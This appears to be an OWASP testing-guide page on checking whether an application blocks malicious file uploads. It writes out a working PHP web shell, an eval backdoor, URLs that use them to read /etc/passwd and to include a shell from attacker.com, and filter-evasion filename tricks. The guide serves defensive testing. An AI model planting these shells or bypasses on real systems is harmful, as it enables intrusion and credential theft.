We regularly check the validity and security of text  but accepting files can introduce even more risk. To reduce the risk we  may only accept certain file extensions, but attackers are able to  encapsulate malicious code into inert file types. Testing for malicious  files verifies that the application/system is able to correctly protect  against attackers uploading malicious files.    <br /><br /> Vulnerabilities related to the uploading of malicious files is unique in  that these “malicious” files can easily be rejected through including  business logic that will scan files during the upload process and reject  those perceived as malicious. Additionally, this is different from  uploading unexpected files in that while the file type may be accepted  the file may still be malicious to the system. <br /><br /> Finally, "malicious" means different things to different systems, for  example Malicious files that may exploit SQL server vulnerabilities may  not be considered a "malicious" to a main frame flat file environment.     <br /><br /> The application may allow the upload of malicious files that include  exploits or shellcode without submitting them to malicious file  scanning. Malicious files could be detected and stopped at various  points of the application architecture such as: IPS/IDS, application  server anti-virus software or anti-virus scanning by application as  files are uploaded (perhaps offloading the scanning using SCAP). <br /><br /> <br /><br /><h2>Example</h2><br />Suppose a picture sharing application allows users to upload their  .gif or .jpg graphic files to the web site. What if an attacker is able  to upload a PHP shell, or exe file, or virus? The attacker may then  upload the file that may be saved on the system and the virus may spread  itself or through remote processes exes or shell code can be executed.  <br /><br /> <br /><br /><h2>How to Test</h2><br />Generic Testing Method <br />• Review the project documentation and use exploratory testing  looking at the application/system to identify what constitutes and  "malicious" file in your environment.  <br />• Develop or acquire a known “malicious” file. An <a href="http://www.eicar.org/85-0-Download.html">EICAR anti-malware test file</a> can be used as harmless, but widely detected by antivirus software. <br />• Try to upload the malicious file to the application/system and verify that it is correctly rejected.    <br />• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated.  <br /><br /> <br /><br /><h3>Exploit Payload</h3><br />• Using the Metasploit payload generation functionality generates a  shellcode as a Windows executable using the Metasploit "msfpayload"  command. <br />• Submit the executable via the application’s upload functionality and see if it is accepted or properly rejected. <br /><br /> <br /><br /><h3>Malicious File</h3><br />• Develop or create a file that should fail the application malware  detection process. There are many available on the Internet such as  ducklin.htm or ducklin-html.htm.   <br />• Submit the executable via the application’s upload functionality and see if it is accepted or properly rejected. <br /><a href="http://www.eicar.org/86-0-intended-use.html">http://www.eicar.org/86-0-intended-use.html</a> <br /><br /><h3>WebShell Backdoor</h3><br />For example upload the 'WebShell-backdoor.php' to the target victim site.<br /> <br />&lt;?php<br /> if(isset($_REQUEST['cmd'])){<br /> echo "&lt;pre&gt;";<br /> $cmd = ($_REQUEST['cmd']);<br /> system($cmd);<br /> echo "&lt;/pre&gt;";<br /> die;<br /> }<br /> ?&gt;<br /><br /> Once it's uploaded, the testers/hackers may get the password by visiting the URL below. <br /><a href="http://TargetVictimSite.com/WebShell-backdoor.php?cmd=cat+/etc/passwd">http://TargetVictimSite.com/WebShell-backdoor.php?cmd=cat+/etc/passwd</a><br />or it may execute by remote file injection as below. <br /><a href="http://TargetVictimSite.com/File.php?include=http://attacker.com/WebShell-backdoor.php">http://TargetVictimSite.com/File.php?include=http://attacker.com/WebShell-backdoor.php</a> <br />Other PHP example: <br />&lt;?php @eval($_POST['password']);?&gt;<br /><br /><h3>Invalid File</h3><br />• Set up the intercepting proxy to capture the “valid” request for an accepted file. <br />• Send an “invalid” request through with a valid/acceptable file  extension and see if the  request is accepted or properly rejected. <br /><br /><h3>Source Code Review</h3><br />When there is file upload feature supported, the following API/methods are common to be found in the source code. <br />•  Java: new file, import, upload, getFileName, Download, getOutputString, fileOutputStream, java.io.file, export<br />•  C/C++: open, fopen<br />•  PHP: move_uploaded_file(),Readfile, file_put_contents(),file(),parse_ini_file(), copy(),fopen(),include(), require()<br /><br /><h3>Evasion of the Filter</h3><br />The following techniques may be used to bypass the website file upload checking rules and filters. <br />•  Change the value of 'Content-Type' as 'image/jpeg' in HTTP request<br />•  Change the extensions as executable extensions such as file.php5, file.shtml, file.asa, file.cert, file.jsp, file.jspx, file.aspx, file.asp, file.phtml<br />•  Changes of capital letters of extensions. such as file.PhP or file.AspX<br />•  Using special trailing such as spaces, dots or null characters such as file.asp… . file.php;jpg, file.asp%00.jpg, 1.jpg%00.php<br />The executable extensions should be in black list  such as file.php5,  file.shtml, file.asa, file.cert, file.jsp, file.jspx, file.aspx,  file.asp, file.phtml <br />•  In IIS6 vulnerability, if the file name is file.asp;file.jpg,the file will be executed as file.asp.<br />http://www.targetVictim.com/path/file.asp;file.jpg<br />•  In NginX, if the original file name is test.jpg, testers/hackers may change it to 'test.jpg/x.php'<br />Once it's uploaded, the file will be executed as x.php <br /><br /><h3>Zip files path</h3><br />One Zip file may contain the malicious PHP with target purpose path such as '..\..\..\..\hacker.php' If the website doesn't check the unzip target path, the hacker.php may unzip to the specified path. <br /><br /><h3>Zip Bomp</h3><br />Upload the ZIP bomb file that may cause application denial of service. <br /><a href="https://github.com/AbhiAgarwal/notes/wiki/Zip-bomb">https://github.com/AbhiAgarwal/notes/wiki/Zip-bomb</a> <br />•  new File, file, OutputSteam, upload, import, file_put_contents, open, fopen<br /><br /><h2>Related Test Cases</h2><br /><a href="https://www.owasp.org/index.php/Test_File_Extensions_Handling_for_Sensitive_Information_(OTG-CONFIG-003)"> Test File Extensions Handling for Sensitive Information (OTG-CONFIG-003)</a>  <br /><a href="https://www.owasp.org/index.php/Test_Upload_of_Unexpected_File_Types_(OTG-BUSLOGIC-008)"> Test Upload of Unexpected File Types (OTG-BUSLOGIC-008)</a>  <br /><br /> <br /><br /><h2>Tools</h2><br />• Metasploit's payload generation functionality  <br />• Intercepting proxy <br /><br /> <br /><br /><h2>References</h2><br />OWASP -

Every  application that accepts files from users must have a mechanism to  verify that the uploaded file does not contain malicious code. Uploaded  files should never be stored where the users or attackers can directly  access them. <br /></div></body></html>
